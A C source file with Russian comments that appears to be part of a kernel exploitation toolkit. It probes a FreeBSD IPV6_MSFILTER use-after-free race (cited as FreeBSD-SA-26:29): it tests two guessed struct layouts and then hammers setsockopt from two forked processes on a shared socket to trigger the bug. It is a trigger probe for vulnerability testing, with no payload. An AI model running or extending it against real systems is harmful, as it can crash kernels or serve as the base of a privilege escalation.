/* t4_ip6_msfilter.c — probe гонки в обработчике IPV6_MSFILTER (FreeBSD-SA-26:29.ip6_multicast).
 * Сверено с FreeBSD releng/11.4: sys/netinet6/in6.h:504 IPV6_MSFILTER=74,
 * комментарий "struct __msfilterreq; set/get multicast source filter list".
 * Баг: обработчик отпускает сериализующий lock, чтобы скопировать список
 * source-фильтров из userland, потом берёт снова; другой поток успевает
 * освободить структуру фильтра -> работа с освобождённой памятью (UAF).
 * Здесь: 1) определяем принятую раскладку struct __msfilterreq (две гипотезы),
 * 2) гоняем accepted-раскладку из двух процессов (fork) на ОДНОМ сокете.
 * Детект: "LAYOUT-ACCEPTED" + отсутствие паники на N итерациях; UAF без KASAN/паники
 * наблюдаемым не бывает — это указано в отчёте.
 */
#include "kexpl.h"

/* гипотеза A: group = sockaddr_storage (128), srcs = указатель (KAME-стиль) */
struct msf_a { u32 ifindex; u32 fmode; u32 nsrcs; u8 group[128]; void *srcs; };
/* гипотеза B: group = sockaddr_in6 (28), srcs = указатель */
struct msf_b { u32 ifindex; u32 fmode; u32 nsrcs; u8 group[28]; void *srcs; };

static u8 srcs[8 * 28];   /* .bss: elfldr НЕ обнуляет, поэтому заполняем явно */

static int try_layout(int fd, int which, int *out_len){
    if (which == 0) {
        struct msf_a r; u8 *p = (u8 *)&r;
        for (unsigned i = 0; i < sizeof(r); i++) p[i] = 0;
        r.ifindex = 1; r.fmode = MCAST_INCLUDE; r.nsrcs = 1; r.srcs = srcs;
        *out_len = (int)sizeof(r);
        return (int)sys5(SYS_setsockopt, fd, IPPROTO_IPV6, IPV6_MSFILTER, (i64)&r, sizeof(r));
    } else {
        struct msf_b r; u8 *p = (u8 *)&r;
        for (unsigned i = 0; i < sizeof(r); i++) p[i] = 0;
        r.ifindex = 1; r.fmode = MCAST_INCLUDE; r.nsrcs = 1; r.srcs = srcs;
        *out_len = (int)sizeof(r);
        return (int)sys5(SYS_setsockopt, fd, IPPROTO_IPV6, IPV6_MSFILTER, (i64)&r, sizeof(r));
    }
}

int trig_main(void){
    if (klog_init("t4-ip6-msfilter", 1)) return 1;
    log_tag("t4"); log_s("IPV6_MSFILTER race probe (FreeBSD-SA-26:29, opt=74)\n");

    /* заполняем список source-фильтров валидными sockaddr_in6 вручную */
    zero_mem(srcs, sizeof(srcs));
    for (int i = 0; i < 8; i++) { srcs[i*28 + 0] = 28; srcs[i*28 + 1] = AF_INET6; }

    i64 fd = sys3(SYS_socket, AF_INET6, SOCK_DGRAM, 0);
    log_tag("t4"); log_s("socket(AF_INET6,DGRAM)="); log_l(fd); log_s("\n");
    if (fd < 0) { log_tag("t4"); log_s("RESULT: SKIP (нет AF_INET6 сокета)\n"); log_flush(1); return 0; }

    int len = 0, accepted = -1, rc_a = 0, rc_b = 0;
    rc_a = try_layout((int)fd, 0, &len);
    log_tag("t4"); log_s("layout A (group=128) rc="); log_l(rc_a); log_s(" len="); log_l(len); log_s("\n");
    if (rc_a == 0) accepted = 0;
    rc_b = try_layout((int)fd, 1, &len);
    log_tag("t4"); log_s("layout B (group=28)  rc="); log_l(rc_b); log_s(" len="); log_l(len); log_s("\n");
    if (accepted < 0 && rc_b == 0) accepted = 1;
    if (accepted >= 0) { log_tag("t4"); log_s("LAYOUT-ACCEPTED="); log_l(accepted); log_s("\n"); }

    if (accepted < 0) {
        log_tag("t4"); log_s("RESULT: SKIP — IPV6_MSFILTER не принят ни в одной раскладке (смотри rc)\n");
        sys1(SYS_close, fd); log_flush(1); return 0;
    }

    /* гонка: два процесса дёргают один и тот же сокет (fd унаследован при fork) */
    i64 pid = sys0(SYS_fork);
    int iters = 4000, ok = 0; (void)ok;
    if (pid == 0) {
        for (int i = 0; i < iters; i++) { int l; if (try_layout((int)fd, accepted, &l) == 0) ok++; }
        sys1(SYS_exit, 0);
        for(;;){}
    }
    int parent_ok = 0;
    for (int i = 0; i < iters; i++) { int l; if (try_layout((int)fd, accepted, &l) == 0) parent_ok++; }
    int st = 0; sys4(SYS_wait4, pid, (i64)&st, 0, 0);
    log_tag("t4"); log_s("race iters="); log_l(iters); log_s(" parent_ok="); log_l(parent_ok); log_s("\n");
    sys1(SYS_close, fd);
    log_tag("t4"); log_s("RESULT: race exercised, no panic observed (UAF виден только по панике/KASAN — см. отчёт)\n");
    log_flush(1);
    return 0;
}
